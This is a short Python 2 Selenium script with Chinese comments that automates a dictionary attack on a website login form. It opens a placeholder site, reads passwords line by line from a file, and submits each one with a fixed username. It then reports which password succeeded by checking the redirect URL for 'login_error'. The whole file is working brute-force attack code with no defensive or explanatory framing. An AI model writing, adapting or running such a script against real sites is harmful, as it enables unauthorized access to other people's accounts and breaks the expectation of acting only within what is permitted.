# coding=utf-8    
from selenium import webdriver    
from selenium.webdriver.common.keys import Keys            
import time

#访问网站
driver = webdriver.Firefox()
url = 'http://www.xxxx.com'
driver.get(url)
print "start"

#获取密码
username = 'yangxiuzhang'
f = open('pass_out.txt', 'r')
for pwd in f:
    pwd = pwd.strip('\n')
    print pwd

    #定位用户名和密码
    #elem_name = driver.find_elements_by_xpath("//input[@id='user_name']")
    elem_name = driver.find_element_by_id("user_name")
    elem_pwd = driver.find_element_by_id("password")
    
    #输入用户名和密码
    elem_name.send_keys(username)
    elem_pwd.send_keys(pwd)
    
    #输入回车键登录
    elem_pwd.send_keys(Keys.RETURN)
    time.sleep(5)
    
    #获取当前网址
    cur_url = driver.current_url
    print cur_url
    if 'login_error' in cur_url:
        print 'error login, the password is ', pwd
    else:
        print 'succeed login, the password is ', pwd
        
f.close()
